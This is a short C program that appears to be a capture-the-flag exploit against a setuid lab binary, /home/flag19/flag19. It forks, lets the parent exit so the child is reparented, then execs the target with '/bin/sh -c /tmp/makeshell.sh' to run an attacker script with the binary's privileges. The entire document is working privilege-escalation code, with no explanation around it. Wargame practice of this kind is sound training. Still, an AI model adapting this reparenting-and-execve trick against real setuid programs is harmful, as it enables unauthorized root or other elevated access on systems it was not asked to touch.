#include <stdio.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp)
{
	printf("I am the gatekeeper at PID %d, PPID %d\n",
		getpid(),getppid());
	int cPID = fork();
	if(cPID >= 0) {
		if(cPID == 0) {
	printf("\nI am the keymaster at PID %d, PPID %d",
		getpid(), getppid());
		sleep(2);
		setresuid(geteuid(),geteuid(),geteuid());
		char *args[] = {"/bin/sh", "-c", "/tmp/makeshell.sh", NULL};
		printf("\nThe door has been opened!\n");
		execve("/home/flag19/flag19", args, envp);
		}
	}
	return 0;
}